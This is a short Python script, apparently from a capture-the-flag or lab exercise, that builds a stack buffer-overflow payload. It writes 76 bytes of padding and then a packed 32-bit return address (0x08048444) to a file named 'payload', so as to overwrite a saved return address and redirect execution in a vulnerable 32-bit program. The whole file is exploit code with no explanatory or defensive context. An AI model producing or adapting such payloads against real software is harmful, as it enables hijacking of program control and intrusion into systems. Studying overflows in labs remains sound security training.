import struct

offset = 76
ret_addr = 0x08048444

payload = b"A" * offset
payload += struct.pack("I", ret_addr)

with open("payload", "wb") as f:
    f.write(payload)